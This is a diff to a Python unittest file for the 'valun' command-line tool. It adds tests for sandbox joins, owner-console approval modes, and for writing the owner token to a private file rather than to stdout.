@@ -4,6 +4,7 @@ mandate's auto_clear (only where the server offers circulation/1), the consents.
 policy show`, `valun clearing status|run`, and `valun sandbox tour` taking a fresh sandbox joiner through the five
 steps of design 9.2 with the exact tracker totals after each step; also `valun sandbox earn` and `buy --pay-with`."""
 import contextlib
+import importlib.metadata
 import io
 import json
 import os
@@ -18,6 +19,7 @@ from unittest import mock
 HERE = os.path.dirname(os.path.abspath(__file__))
 sys.path.insert(0, os.path.join(os.path.dirname(HERE), 'src'))
 sys.path.insert(0, HERE)
+from valun import __version__  # noqa: E402
 from valun import agent as va  # noqa: E402
 from valun import cli  # noqa: E402
 from valun import client as vc  # noqa: E402
@@ -34,6 +36,22 @@ TOUR_TOTALS = {1: {'sandbox-exact -> you': 3},
 TOUR_DONE = ('The tour is complete: you earned 6 PC and spent 6 PC (4 by transfer, 2 with your own note), and set-offs '
              'cancelled 2 PC of your claims and 2 PC of your debts without changing your net position. You can keep trading '
              'with the sandbox agents.')
+# What a profile 's' that has not joined tells its owner to run (the 0.7.2 clean-user test): the sandbox join, complete
+# as written but for its placeholders, then its uvx form.
+SANDBOX_JOIN = 'valun --profile s join --sandbox --handle YOUR-HANDLE --operator "YOUR NAME"'
+JOIN_HINT = f'run `{SANDBOX_JOIN}` in a terminal (with uvx: `uvx --from valun=={__version__} valun ...`)'
+
+
+_REAL_DISTRIBUTION = importlib.metadata.distribution
+
+
+def _no_valun_install(name):
+    """importlib.metadata.distribution, as if no valun were installed: the hints under test then name `valun==X`
+    (cli._uvx_from), as for a valun from an index, whatever installed this one (CI: `pip install ./python`, whose
+    direct_url.json names the folder's URL, which the hints would name)."""
+    if name == 'valun':
+        raise importlib.metadata.PackageNotFoundError(name)
+    return _REAL_DISTRIBUTION(name)
 
 
 class Tty(io.StringIO):
@@ -47,7 +65,9 @@ class Cli(unittest.TestCase):
     def setUp(self):
         self.home = tempfile.TemporaryDirectory()
         self.addCleanup(self.home.cleanup)
-        env = mock.patch.dict(os.environ, {'VALUN_HOME': self.home.name})
+        # HOME and USERPROFILE too: join writes the owner token to $HOME/valun-owner-token-HANDLE.txt when no
+        # --owner-token-file is given, never into the real home folder of whoever runs the tests.
+        env = mock.patch.dict(os.environ, {'VALUN_HOME': self.home.name, 'HOME': self.home.name, 'USERPROFILE': self.home.name})
         env.start()
         self.addCleanup(env.stop)
         self.world = World(self.features, s_key=None)
@@ -61,7 +81,14 @@ class Cli(unittest.TestCase):
                                                                   sleep=lambda s: clock.__setitem__(0, clock[0] + max(s, 0.001))))
         nap.start()
         self.addCleanup(nap.stop)
+        # An enrollment is sent again at once when no answer is read.
+        fast = mock.patch.object(vc, 'ENROLL_RETRY_S', (0, 0))
+        fast.start()
+        self.addCleanup(fast.stop)
         self.token_file = os.path.join(self.home.name, 'owner.txt')
+        meta = mock.patch('importlib.metadata.distribution', _no_valun_install)
+        meta.start()
+        self.addCleanup(meta.stop)
 
     def run_cli(self, *argv, stdin=None, tty=False, answers=None):
         out = Tty() if tty else io.StringIO()
@@ -140,6 +167,239 @@ class Join(Cli):
         self.assertEqual(va.INVITE_CONSENT_POLICY, {'setoff': True, 'as_issuer': True, 'as_new_creditor': False, 'max_PC': 50})
 
 
+class ConsoleByDefault(Cli):
+    """Fitz's decision of 2026-11-17 (fix inbox #138): `valun join --sandbox` holds commitments for the owner console
+    when --approvals is not given; an invited join still asks. The owner token goes to a file the owner can find, and
+    `valun console` opens the console: its address, where the token is (never the token), what waits there."""
+
+    def test_a_sandbox_join_without_approvals_uses_console_and_says_how_to_change_it(self):
+        rc, out = self.run_cli('join', '--sandbox', '--handle', 'stranger', '--operator', 'Ann', '--server', SERVER,
+                               '--owner-token-file', self.token_file)
+        self.assertEqual(rc, 0, out)
+        self.assertEqual(self.world.puts, [{'approve_above': 0, 'review_deliveries': True, 'auto_clear': True}])
+        disk = self.disk()
+        self.assertEqual((disk['approvals'], disk['owner_token_file']), ('console', os.path.abspath(self.token_file)))
+        self.assertIn('Approvals: console. Your agent signs at once and asks nobody', out)
+        self.assertIn(cli.CONSOLE_HOLDS, out)
+        self.assertIn('`valun --profile s console` opens the console and says what approving and rejecting do', out)
+        self.assertIn('Console is what `join --sandbox` uses when --approvals is not given. To change it: `valun --profile s '
+                      f'config approvals MODE --owner-token-file {cli._faithful(self.token_file, 300)}`', out)
+        self.assertNotIn('vpo_test-only', json.dumps(disk))
+        # The Nov 18 fresh-join run (finding 3): the console paragraph was about 400 of join's 614 words. It is three
+        # lines and a link now; `valun console` says what approving and rejecting do (CONSOLE_DECIDES).
+        line = next(x for x in out.splitlines() if x.startswith('Approvals: console.'))
+        self.assertLessEqual(len(line), 4 * 118, line)
+        self.assertTrue(line.endswith(f'says what approving and rejecting do ({cli.CONSOLE_DOC}).'), line)
+        self.assertNotIn(cli.CONSOLE_DECIDES, out)
+        self.assertLess(len(out.split()), 400, f'{len(out.split())} words')
+
+    def test_an_invited_join_still_asks_and_any_mode_can_be_given(self):
+        rc, out = self.run_cli('join', '--invite-from-stdin', '--handle', 'stranger', '--operator', 'Ann', '--server', SERVER,
+                               '--owner-token-file', self.token_file, stdin='invite-code\n')
+        self.assertEqual(rc, 0, out)
+        self.assertEqual(self.disk()['approvals'], 'ask')
+        self.assertIn('Approvals: ask. Before your agent signs a commitment', out)
+        self.assertNotIn('Console is what', out)
+        for mode in ('ask', 'none', 'client-prompt'):
+            with self.subTest(mode=mode):
+                rc, out = self.main(['--profile', f'm-{mode}', 'join', '--sandbox', '--handle', 'stranger', '--operator',
+                                     'Ann', '--approvals', mode, '--server', SERVER, '--owner-token-file',
+                                     os.path.join(self.home.name, f'owner-{mode}.txt')])
+                self.assertEqual(rc, 0, out)
+                with open(os.path.join(self.home.name, 'profiles', f'm-{mode}.json'), encoding='utf-8') as fh:
+                    self.assertEqual(json.load(fh)['approvals'], mode)
+                self.assertIn(f'Approvals: {mode}.', out)
+
+    def test_join_help_says_what_each_mode_does(self):
+        out = io.StringIO()
+        with contextlib.redirect_stdout(out), self.assertRaises(SystemExit):
+            cli.main(['join', '--help'])
+        words = ' '.join(out.getvalue().split())
+        for w in ('default: console with --sandbox, ask without', 'console: your agent signs at once',
+                  'never an honor of a guarantee call', 'ask: your MCP app shows you an approval form',
+                  "own confirmation of each signing tool call; whatever it lets run is signed", 'none: your agent signs on its own',
+                  'default: $HOME/valun-owner-token-HANDLE.txt'):
+            self.assertIn(w, words)
+
+    def console(self, *extra, env=None):
+        opened = []
+        with mock.patch.object(cli.webbrowser, 'open', lambda url: opened.append(url) or True), \
+                mock.patch.dict(os.environ, env or {}):
+            rc, out = self.run_cli('console', *extra)
+        return rc, out, opened
+
+    def test_valun_console_prints_the_address_and_the_token_file_and_opens_it(self):
+        self.run_cli('join', '--sandbox', '--handle', 'stranger', '--operator', 'Ann', '--server', SERVER,
+                     '--owner-token-file', self.token_file)
+        with mock.patch.object(cli, '_no_browser', lambda: None):
+            rc, out, opened = self.console()
+        self.assertEqual((rc, opened), (0, [f'{SERVER}/pilot#owner']))
+        self.assertIn(f'Owner console: {SERVER}/pilot#owner (participant {S_ID}, profile s)', out)
+        self.assertIn(f'Sign in with your owner token: it is in {self.token_file}', out)
+        # what waits there is the mandate's, which this command does not read: it says what console sets it to
+        self.assertIn('Approvals: console. What waits for you there, with the owner mandate console sets (Ask me above 0, '
+                      'Review deliveries on; the console shows yours): ' + cli.CONSOLE_HOLDS, out)
+        self.assertIn('Opened it in your default browser.', out)
+        self.assertNotIn('vpo_test-only', out)                       # never the token itself
+        rc, out, opened = self.console('--no-open')
+        self.assertEqual((rc, opened), (0, []))
+        self.assertIn('Not opened in a browser (you passed --no-open): open the address above in a browser yourself.', out)
+        os.remove(self.token_file)                                   # moved into a password manager
+        rc, out, opened = self.console('--no-open')
+        self.assertIn('which is no longer there (moved into your password manager?)', out)
+
+    def test_valun_console_opens_no_browser_on_a_headless_machine(self):
+        self.join()
+        with mock.patch.object(cli.sys, 'platform', 'linux'):
+            rc, out, opened = self.console(env={'DISPLAY': '', 'WAYLAND_DISPLAY': '', 'BROWSER': ''})
+        self.assertEqual((rc, opened), (0, []))
+        self.assertIn('Not opened in a browser (this machine has no display (headless))', out)
+        # the 0.7.2 review: it does not read the mandate, so it never asserts what Ask me above is now
+        self.assertIn('Approvals: none. The console holds only what your owner mandate holds, as the console shows it', out)
+        self.assertIn('Where valun set your mandate (at join, or when this profile left console approvals), Ask me above is '
+                      'your per-deal limit', out)
+        self.assertNotIn('In this mode valun sets approve_above', out)
+        with mock.patch.object(cli.sys, 'platform', 'linux'):
+            rc, out, opened = self.console(env={'DISPLAY': ':0'})
+        self.assertEqual(opened, [f'{SERVER}/pilot#owner'])
+        with mock.patch.object(cli, '_no_browser', lambda: None), mock.patch.object(cli.webbrowser, 'open', lambda url: False):
+            rc, out = self.run_cli('console')
+        self.assertIn('No browser could be opened here: open the address above in a browser yourself.', out)
+
+    def test_valun_console_before_a_join(self):
+        rc, out, opened = self.console('--no-open', '--server', SERVER)
+        self.assertEqual(rc, 0, out)
+        self.assertIn(f'Owner console: {SERVER}/pilot#owner', out)
+        self.assertIn("Profile 's' is not joined yet, so it has no owner token: join first, `valun --profile s join --sandbox", out)
+        self.assertNotIn('Approvals:', out)              # nothing waits for a profile that has not joined
+
+    def console_tour(self, *extra, tty=False):
+        """`valun sandbox tour` of a console join, with sandbox.tour recorded instead of run: (rc, output, its kwargs)."""
+        seen = {}
+
+        def tour(store, **kw):
+            seen.update(kw)
+            return {'done': True, 'steps': []}
+        with mock.patch.object(sb, 'tour', tour):
+            rc, out = self.run_cli('sandbox', 'tour', *extra, tty=tty)
+        return rc, out, seen
+
+    def test_the_tour_in_console_mode_asks_nothing_here_and_says_where_its_steps_wait(self):
+        # The server holds what the tour signs for the owner console: a terminal prompt as well would ask twice.
+        self.run_cli('join', '--sandbox', '--handle', 'stranger', '--operator', 'Ann', '--server', SERVER,
+                     '--owner-token-file', self.token_file)
+        self.world.mandate.update(approve_above=0, review_deliveries=True)     # what the join's mandate PUT set
+        rc, out, seen = self.console_tour()                     # no terminal: in console mode nothing is asked here
+        self.assertEqual(rc, 0, out)
+        self.assertEqual((seen['yes'], seen['ask'], seen['console_command'], seen['console']),
+                         (True, None, 'valun --profile s console', True))
+        # the 0.7.2 review: the tour's payments by transfer (steps 2 and 5) wait 20 minutes only
+        self.assertIn(f'Console approvals: the tour asks nothing here. What it signs for your agent waits for you in the owner '
+                      f'console ({SERVER}/pilot#owner; `valun --profile s console` opens it): its offers and acceptances, the '
+                      'IOUs it pays with (approve each by the deadline its card shows, within the hour), and its payments by '
+                      'transfer (steps 2 and 5), which wait only 20 minutes before they end (the tour then signs them '
+                      'again).', out)
+
+    def test_a_console_tour_asks_here_once_the_mandate_no_longer_holds_every_step(self):
+        """The 0.7.2 review: the tour took the profile's mode for the mandate, so an owner who had raised Ask me above or
+        unticked Review deliveries since had those steps signed, and taking effect, with nobody asked."""
+        self.run_cli('join', '--sandbox', '--handle', 'stranger', '--operator', 'Ann', '--server', SERVER,
+                     '--owner-token-file', self.token_file)
+        for change in ({'approve_above': 0, 'review_deliveries': False}, {'approve_above': 5, 'review_deliveries': True}):
+            self.world.mandate.update(change)
+            rc, out, seen = self.console_tour()
+            self.assertEqual((rc, seen), (3, {}), out)                  # nobody at this terminal: nothing runs
+            self.assertIn('Your profile uses console approvals, but your owner mandate no longer holds every step of the tour '
+                          'for you in the owner console (Ask me above ', out)
+            self.assertIn('the tour asks you here before each commitment instead.', out)
+            rc, out, seen = self.console_tour(tty=True)
+            self.assertEqual((rc, seen['yes'], seen['ask'], seen['console']), (0, False, cli._ask_terminal, False))
+            rc, out, seen = self.console_tour('--yes')                  # --yes: signed at once, held as the mandate holds
+            self.assertEqual((rc, seen['yes'], seen['ask'], seen['console']), (0, True, None, False))
+            self.assertIn('with --yes the tour signs at once every commitment its own rules allow, and only what your '
+                          'mandate holds waits there.', out)
+            self.assertNotIn('the tour asks you here', out)
+        self.world.fail['GET /pilot/v1/me'] = [vc.ValunError('unauthorized', 'revoked', 401)]
+        rc, out, seen = self.console_tour(tty=True)
+        self.assertEqual((rc, seen), (1, {}))
+        self.assertIn('Cannot read your owner mandate (unauthorized): revoked. Nothing was signed.', out)
+
+    def test_tour_yes_help_says_console_still_holds_each_step(self):
+        out = io.StringIO()
+        with contextlib.redirect_stdout(out), self.assertRaises(SystemExit):
+            cli.main(['sandbox', 'tour', '--help'])
+        words = ' '.join(out.getvalue().split())
+        self.assertIn("approve here, without asking, every commitment the tour's own rules allow", words)
+        self.assertIn('with console approvals each step still waits for you in the owner console', words)
+
+    def test_buy_says_where_each_held_step_waits_and_stops_on_a_rejected_offer(self):
+        # The 0.7.2 review: `sandbox buy` logged proposed_awaiting_owner without saying where to approve it (earn did),
+        # and waited out its deadline on an offer the owner had rejected.
+        lines, views = [], iter([{'status': 'rejected_by_owner'}])
+        stub = types.SimpleNamespace(state={'server': SERVER + '/'}, participant_id=S_ID, unit='PC', network=None,
+                                     directory=lambda: [{'id': X_ID, 'handle': 'sandbox-exact'}],
+                                     propose=lambda *a: {'id': 'vd_0123456789abcdef', 'status': 'proposed_awaiting_owner'},
+                                     deal=lambda did: next(views))
+        with mock.patch.object(sb.vc, 'Client', lambda store, server=None: stub):
+            r = sb.buy(None, 'sandbox-exact', 'text-stats', 'hi', server=SERVER, log=lines.append, poll_s=0)
+        self.assertEqual(r, {'deal_id': 'vd_0123456789abcdef', 'status': 'rejected_by_owner', 'verified': None})
+        self.assertIn(f'  your offer waits for you in the owner console ({SERVER}/pilot#owner): approve it there, and this '
+                      'goes on by itself', lines)
+        self.assertEqual(lines[-1], 'deal vd_0123456789abcdef: rejected_by_owner')
+        self.assertIn('within 20 minutes', sb.owner_hint(stub, 'completion_awaiting_owner'))
+        self.assertIsNone(sb.owner_hint(stub, 'agreed'))
+
+    def test_earn_says_where_a_held_acceptance_waits(self):
+        lines = []
+        states = iter(['accepted_awaiting_owner', 'expired'])
+        c = types.SimpleNamespace(state={'server': SERVER + '/'}, participant_id=S_ID,
+                                  deal=lambda did: {'status': next(states), 'current': None})
+        r = sb._deliver_and_wait(c, 'vd_0123456789abcdef', 'text-stats', 'x', 2, 60, lines.append, 0)
+        self.assertEqual(r['status'], 'expired')
+        self.assertIn(f'  your acceptance waits for you in the owner console ({SERVER}/pilot#owner): approve it there, and '
+                      'this goes on by itself', lines)
+
+    def test_an_attempt_the_server_held_and_never_sent_is_listed_as_not_applied(self):
+        c = types.SimpleNamespace(unit='nanoERG', pubkey='02' + '11' * 32)
+        row = {'ref': '#1', 'edge': f"{'02' + '11' * 32}>{'03' + '22' * 32}", 'route': 'note', 'prior': 3, 'total': 5,
+               'timestamp': 1_794_957_033_997, 'attempt_id': None, 'outcome': 'not_applied', 'paid': False,
+               'server_ended': {'state': 'rejected', 'approval_id': 'va_17df22079678', 'at': None}, 'state': 'alive'}
+        line = cli._attempt_line(c, row)
+        # the RC's staging test (2026-11-18): the console names the server's time, a minute sooner, so this one says
+        # what it is
+        self.assertIn(': not applied (the server held it for your owner, who rejected it in the owner console, and never '
+                      "sent it on). A new IOU of this deal can be signed now, while the pair's IOU is unchanged; paying it by "
+                      "transfer waits until after 2026-11-18T00:12:33.997Z (your Valun client's time, a minute after the "
+                      "server's, which the owner console shows, as a margin for clocks that differ), or until your client "
+                      'sees this IOU move past it', line)
+        self.assertNotIn('you resolved it', line)
+        self.assertIn('did not apply (the server held it for your owner and never sent it on: its hold expired before your '
+                      'owner decided)', cli._attempt_line(c, dict(row, state='dead', server_ended={'state': 'void_expired'})))
+        # The 0.7.2 review: a payment by transfer held and rejected frees a transfer through the same IOU at the same
+        # prior state, never a new IOU of the deal (the client refuses that until the window has passed).
+        transfer = dict(row, route='transfer', timestamp=1_794_957_033_999, edge=f"{'03' + '33' * 32}>{'02' + '11' * 32}",
+                        server_ended={'state': 'rejected', 'approval_id': 'va_27df22079678', 'at': None})
+        line = cli._attempt_line(c, transfer)
+        self.assertIn('A payment through the same IOU at the same prior state can be signed now; your own IOU or any other '
+                      f'payment of this deal waits until after 2026-11-18T00:12:33.999Z ({va.MARGIN_WORDS}), or until your '
+                      'client sees that IOU move past it', line)
+        self.assertNotIn('A new IOU of this deal can be signed now', line)
+        # one approved after its hour was sent, and refused: never "never sent it on"
+        late = cli._attempt_line(c, dict(row, state='dead', server_ended={'state': 'novation_expired'}))
+        self.assertIn('did not apply (your owner approved it after its hour, and the tracker refused it)', late)
+        self.assertNotIn('never sent', late)
+        # a transfer that expired (its own state: waiting for the owner, or collecting signatures after an approval)
+        self.assertIn('it expired before every party had signed it (while it waited for your owner, or while it collected '
+                      'signatures)', cli._attempt_line(c, dict(transfer, state='dead', server_ended={'state': 'expired'})))
+
+    def test_doctor_names_the_console_command_in_console_mode(self):
+        self.run_cli('join', '--sandbox', '--handle', 'stranger', '--operator', 'Ann', '--server', SERVER,
+                     '--owner-token-file', self.token_file)
+        rc, out = self.run_cli('doctor')
+        self.assertIn('Approvals: console. ' + cli.APPROVAL_TEXT['console'] + ' `valun --profile s console` opens the owner '
+                      'console.', out)
+
+
 class JoinWithoutCirculation(Cli):
     features = None
 
@@ -150,11 +410,23 @@ class JoinWithoutCirculation(Cli):
         self.assertIn('does not offer circulating credit yet', out)
         self.assertNotIn('Clearing:', out)
 
+    def test_the_next_block_has_both_branches_without_circulation_too(self):
+        # The Nov 18 fresh-join run (finding 3): 0.7.1 ended with the MCP line only, and the RC added the shell line only
+        # where the server offers circulating credit. Without it there is nothing to sign in the background, and a shell
+        # agent still reads its inbox regularly.
+        out = self.join()
+        self.assertTrue(out.endswith(
+            'Next: run `valun --profile s doctor`, then, for your agent, one of:\n'
+            '  - In an MCP app: add `valun --profile s mcp` to it (see `valun mcp --help`).\n'
+            '  - From a shell: run `valun --profile s call valun_inbox` regularly, which shows what waits for your agent '
+            f'(with uvx: `uvx --from valun=={__version__} valun ...`).\n'), out)
+
 
 class JoinKeepsTheOwnerToken(Cli):
-    """FX2-PY: `valun join` hands the owner token over (writes --owner-token-file, or shows it) right after enrolment,
-    before the pin and mandate steps, so an error in those steps (a 429 here) never loses it; join then says what is
-    not in force and how to finish, and exits 1."""
+    """FX2-PY: `valun join` hands the owner token over (writes --owner-token-file, or the default file
+    $HOME/valun-owner-token-HANDLE.txt, and shows it only when that file cannot be written) right after enrolment, before
+    the pin and mandate steps, so an error in those steps (a 429 here) never loses it; join then says what is not in
+    force and how to finish, and exits 1."""
     RATE = ('rate_limited', 'too many requests; slow down', 429)
 
     def rate_limit(self, route):
@@ -164,9 +436,14 @@ class JoinKeepsTheOwnerToken(Cli):
         return self.run_cli('join', '--sandbox', '--handle', 'stranger', '--operator', 'Ann', '--server', SERVER, *extra,
                             *(['--owner-token-file', self.token_file] if file else []))
 
-    def token_in_file(self):
-        with open(self.token_file, encoding='utf-8') as f:
+    def token_in_file(self, path=None):
+        with open(path or self.token_file, encoding='utf-8') as f:
             return f.read()
+
+    def default_file(self, handle='stranger'):
+        """Where join writes the owner token without --owner-token-file: $HOME/valun-owner-token-HANDLE.txt (the
+        test's home)."""
+        return os.path.join(self.home.name, f'valun-owner-token-{handle}.txt')
 
     def test_the_token_is_handed_over_before_the_pin_and_mandate_steps(self):
         seen, handle = [], self.world.handle
@@ -189,14 +466,146 @@ class JoinKeepsTheOwnerToken(Cli):
         self.assertNotIn('vpo_test-only', json.dumps(disk))
         self.assertEqual(self.world.puts, [])
 
-    def test_a_429_on_the_mandate_put_without_a_file_shows_the_token_first(self):
+    def test_a_429_on_the_mandate_put_without_a_file_writes_the_default_file_first(self):
+        # No --owner-token-file: the token goes to $HOME/valun-owner-token-HANDLE.txt (a new private file) before the
+        # mandate step, never to the screen, and the profile keeps that path (never the token) for `valun console`.
         self.rate_limit('PUT /pilot/v1/owner/mandate')
         rc, out = self.run_join('--approvals', 'none', file=False)
         self.assertEqual(rc, 1, out)
-        self.assertIn('\n  vpo_test-only\n', out)
-        self.assertLess(out.index('vpo_test-only'), out.index('Your owner mandate could not be set (rate_limited)'))
+        self.assertEqual(self.token_in_file(self.default_file()), 'vpo_test-only\n')
+        self.assertNotIn('vpo_test-only', out)
+        self.assertIn(f'Your OWNER token is in {self.default_file()} (no --owner-token-file was given: this is where join '
+                      'writes it).', out)
+        self.assertLess(out.index('Your OWNER token is in'), out.index('Your owner mandate could not be set (rate_limited)'))
         self.assertIn('approve_above in your owner mandate was not set', out)
-        self.assertNotIn('vpo_test-only', json.dumps(self.disk()))
+        disk = self.disk()
+        self.assertNotIn('vpo_test-only', json.dumps(disk))
+        self.assertEqual(disk['owner_token_file'], os.path.abspath(self.default_file()))
+
+    # ---------- the Nov 18 fresh-join run, finding 4: the owner token never on stdout ----------
+    def refused(self, rc, out, path):
+        """join sent nothing (no request reached the server, no profile, no key), said why, and exited 2."""
+        self.assertEqual(rc, 2, out)
+        self.assertTrue(out.startswith('Nothing was sent: '), out)
+        self.assertIn(path, out)
+        self.assertIn('and run this join again: `valun --profile s join --sandbox --handle stranger --operator Ann', out)
+        self.assertIn(f"--owner-token-file FILE --server {SERVER}` (FILE: a new file for this join's owner token).", out)
+        self.assertEqual(self.world.requests(), [])
+        self.assertFalse(os.path.exists(os.path.join(self.home.name, 'profiles', 's.json')))
+        self.assertNotIn('vpo_', out)
+
+    def test_an_existing_token_file_is_refused_before_anything_is_sent(self):
+        # 0.7.1 and the RC sent the join, made the participant, printed its owner token on stdout (an agent's context)
+        # and exited 1. The file keeps its bytes (it may hold another identity's token).
+        with open(self.token_file, 'w', encoding='utf-8') as f:
+            f.write('vpo_another-identity\n')
+        rc, out = self.run_join('--approvals', 'none')
+        self.refused(rc, out, self.token_file)
+        self.assertIn(f'Nothing was sent: {self.token_file} exists already, and join never replaces a file: it may hold '
+                      'another owner token. Name a new file, one that does not exist yet, and run this join again', out)
+        self.assertEqual(self.token_in_file(), 'vpo_another-identity\n')
+
+    def test_without_a_file_an_existing_default_file_is_refused_before_anything_is_sent(self):
+        # The RC's second way in: no --owner-token-file, and $HOME/valun-owner-token-HANDLE.txt there already (another
+        # join of this handle, say, or a retry). Refused the same way; the default file keeps its bytes.
+        with open(self.default_file(), 'w', encoding='utf-8') as f:
+            f.write('vpo_another-identity\n')
+        rc, out = self.run_join('--approvals', 'none', file=False)
+        self.refused(rc, out, self.default_file())
+        self.assertIn(f'{self.default_file()} exists already (join writes your owner token there when no '
+                      '--owner-token-file is given), and join never replaces a file', out)
+        self.assertEqual(self.token_in_file(self.default_file()), 'vpo_another-identity\n')
+
+    def test_a_token_file_in_a_missing_folder_is_refused_before_anything_is_sent(self):
+        self.token_file = os.path.join(self.home.name, 'no-such-folder', 'owner.txt')
+        rc, out = self.run_join('--approvals', 'none')
+        self.refused(rc, out, self.token_file)
+        self.assertIn(f'the folder of {self.token_file}, {os.path.dirname(self.token_file)}, does not exist, so your owner '
+                      'token could not be written there. Name a new file in a folder that exists', out)
+        self.assertFalse(os.path.exists(os.path.dirname(self.token_file)))
+
+    def test_a_folder_that_takes_no_new_file_is_refused_before_anything_is_sent(self):
+        # A read-only grant, or Windows' Controlled folder access: home.new_file_refused's probe file cannot be made.
+        home = os.path.normcase(os.path.abspath(self.home.name))
+        with mock.patch.object(cli, 'new_file_refused',
+                               lambda folder: 'Access is denied.' if os.path.normcase(folder) == home else None):
+            rc, out = self.run_join('--approvals', 'none')
+        self.refused(rc, out, self.token_file)
+        self.assertIn(f'this user may not create a file in {self.home.name} (Access is denied), where {self.token_file} '
+                      'would go. Name a new file in a folder you can write', out)
+
+    def test_a_token_file_that_appears_while_the_join_is_on_its_way_goes_to_a_new_file_beside_it(self):
+        # The race: the file was not there when join checked, and is there when the token is written. It is never
+        # replaced; the token goes to owner.1.txt (owner.2.txt when that is taken too), which join names, and never to
+        # stdout. Join does its other steps, and exits 1: the file named does not hold this token.
+        handle, sibling = self.world.handle, os.path.join(self.home.name, 'owner.1.txt')
+
+        def another_join(method, path, body=None, token=None):
+            if path == '/pilot/v1/join-sandbox':
+                for p in (self.token_file, sibling):
+                    with open(p, 'w', encoding='utf-8') as f:
+                        f.write('vpo_another-identity\n')
+            return handle(method, path, body, token)
+        self.world.handle = another_join
+        rc, out = self.run_join('--approvals', 'none')
+        self.assertEqual(rc, 1, out)
+        newer = os.path.join(self.home.name, 'owner.2.txt')
+        self.assertEqual((self.token_in_file(), self.token_in_file(sibling), self.token_in_file(newer)),
+                         ('vpo_another-identity\n', 'vpo_another-identity\n', 'vpo_test-only\n'))
+        self.assertIn(f'{self.token_file} appeared after join checked it, and join never replaces a file (it may hold '
+                      f'another owner token), so your OWNER token is in a new file beside it: {newer}.', out)
+        self.assertNotIn('vpo_', out)
+        self.assertLess(out.index('your OWNER token is in a new file'), out.index('Joined Valun as stranger'))
+        self.assertEqual(self.world.puts, [{'approve_above': 5, 'auto_clear': True}])    # the other steps were done
+        self.assertEqual(self.disk()['owner_token_file'], os.path.abspath(newer))           # for `valun console`
+        self.assertEqual(out.rstrip().splitlines()[-1],
+                         f'Exit code 1: {self.token_file} was not written: your owner token is in {os.path.abspath(newer)}.')
+
+    def no_file_at_all(self):
+        """_write_private fails for every file (the disk filled up after join checked the folder, which it does with a
+        probe file of its own, not with _write_private)."""
+        return mock.patch.object(cli, '_write_private', side_effect=OSError(*self.DISK_FULL))
+
+    def test_when_no_file_can_be_written_the_token_is_shown_on_a_terminal_only(self):
+        # Not a terminal (an agent's pipe): the token is shown nowhere, on stdout or stderr, and join says how the owner
+        # gets a new one. A terminal: on stderr only, never on stdout.
+        for tty in (False, True):
+            with self.subTest(tty=tty):
+                err = Tty() if tty else io.StringIO()
+                with self.no_file_at_all(), contextlib.redirect_stderr(err):
+                    rc, out = self.run_cli('--profile', f'nf{int(tty)}', 'join', '--sandbox', '--handle', 'stranger',
+                                           '--operator', 'Ann', '--approvals', 'none', '--server', SERVER,
+                                           '--owner-token-file', os.path.join(self.home.name, f'nf{int(tty)}.txt'))
+                self.assertEqual(rc, 1, out)
+                self.assertNotIn('vpo_', out)
+                self.assertIn(f"Cannot write {os.path.join(self.home.name, f'nf{int(tty)}.txt')} (No space left on device).", out)
+                if tty:
+                    self.assertIn('\n  vpo_test-only\n', err.getvalue())
+                    self.assertIn('Your owner token was shown once on this terminal (stderr), never on stdout', out)
+                else:
+                    self.assertNotIn('vpo_', err.getvalue())
+                    self.assertIn('Your owner token was not shown either: stderr is not a terminal here, and an agent may '
+                                  f'be reading it. No copy of it is kept, so nobody can sign in to the owner console '
+                                  f'({SERVER}/pilot#owner) for {S_ID}, to approve what it holds for you, change limits or '
+                                  'revoke the agent, until the operator of this server issues a new owner token for it, '
+                                  'at your request.', out)
+                self.assertIn('Joined Valun as stranger', out)
+                self.assertTrue(out.rstrip().endswith('was not written.'), out)
+
+    def test_a_token_file_not_written_is_named_file_and_said_what_it_is(self):
+        # The RC's review (R2-OTHER-9 c): where the token file could not be named as one word (not written here), the
+        # next commands printed --owner-token-file FILE with nothing that said FILE is the owner token file.
+        with self.no_file_at_all():
+            rc, out = self.run_join(file=False)                  # console, a sandbox join's default
+        self.assertEqual(rc, 1, out)
+        self.assertIn('config approvals MODE --owner-token-file FILE` (MODE: ask, client-prompt or none; FILE: the file '
+                      'holding your owner token).', out)
+        with self.no_file_at_all():
+            rc, out = self.run_cli('--profile', 'asker', 'join', '--sandbox', '--handle', 'asker', '--operator', 'Ann',
+                                   '--approvals', 'ask', '--server', SERVER)
+        self.assertEqual(rc, 1, out)
+        self.assertIn('config approvals console --owner-token-file FILE` (FILE: the file holding your owner token) lets your '
+                      'agent sign at once', out)
 
     def test_console_approvals_are_recorded_only_once_the_mandate_holds_them(self):
         # The PUT fails: the profile asks before each commitment (not 'console', which the server does not hold yet), its
@@ -208,7 +617,7 @@ class JoinKeepsTheOwnerToken(Cli):
         disk = self.disk()
         self.assertEqual(disk['approvals'], 'ask')
         self.assertEqual(disk['consent_policy'], dict(va.SANDBOX_CONSENT_POLICY, setoff=False))
-        self.assertIn('`valun --profile s config approvals console --owner-token-file FILE`', out)
+        self.assertIn(f'`valun --profile s config approvals console --owner-token-file {cli._faithful(self.token_file, 300)}`', out)
         self.assertIn('Then run `valun --profile s doctor`.', out)
         self.assertIn('auto_clear was not turned off', out)
         rc, out = self.run_cli('config', 'approvals', 'console', '--owner-token-file', self.token_file)
@@ -227,7 +636,8 @@ class JoinKeepsTheOwnerToken(Cli):
         config, doctor = self.printed(joined, 'until you run'), self.printed(joined, 'Then run')
         rc, out = self.main(config)
         self.assertEqual(rc, 0, out)
-        self.assertIn('Owner mandate updated: every commitment now waits for you in the owner console', out)
+        self.assertIn('Owner mandate updated (approve_above 0, review_deliveries on): ' + cli.CONSOLE_HOLDS
+                      + ' now wait for you in the owner console', out)
         self.assertEqual(self.world.puts, [{'approve_above': 0, 'review_deliveries': True}])     # S's mandate (S's token)
         self.assertEqual(self.disk()['approvals'], 'console')
         self.unchanged(default, before)
@@ -243,8 +653,8 @@ class JoinKeepsTheOwnerToken(Cli):
         # Every command a join prints names its profile (only `valun mcp --help`, the same for every profile, does not).
         out = self.join()
         self.assertEqual([x for x in re.findall(r'`valun ([^`]+)`', out) if not x.startswith('--profile s ')], ['mcp --help'])
-        self.assertEqual(self.printed(out, 'Next:'), ['--profile', 's', 'doctor'])
-        self.assertIn('then add `valun --profile s mcp` to your agent', out)
+        self.assertEqual(self.printed(out, 'Next: run'), ['--profile', 's', 'doctor'])
+        self.assertIn('  - In an MCP app: add `valun --profile s mcp` to it', out)
         self.assertIn('change it with `valun --profile s config consents.<role> on|off`', out)
         # VALUN_PROFILE set but empty selects the default profile: the commands name it (not an empty --profile).
